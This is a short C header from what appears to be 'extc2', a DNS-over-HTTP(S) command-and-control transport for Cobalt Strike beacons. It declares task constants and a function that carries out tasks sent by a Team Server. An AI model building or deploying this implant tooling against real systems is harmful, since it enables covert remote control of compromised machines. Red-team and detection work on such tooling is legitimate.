/*-
 *
 * extc2: open source dns over http(s)
 * transport for cs. does not use the
 * smb beacon.
 *
-*/

#pragma once

#define BEACON_TASK_EXIT_REQUEST	3
#define BEACON_TASK_EXIT_CALLBACK	26

/*-
 *
 * BeaconTask
 *
 * Purpose:
 *
 * Executes the requested task, and returns
 * an unencryptes response to send to Team
 * Server.
 *
-*/
DEFINESEC(B) PBEACON_TASK_RES_HDR BeaconTask( PBEACON_INSTANCE Ins, PBEACON_TASK_REQ_HDR Req );
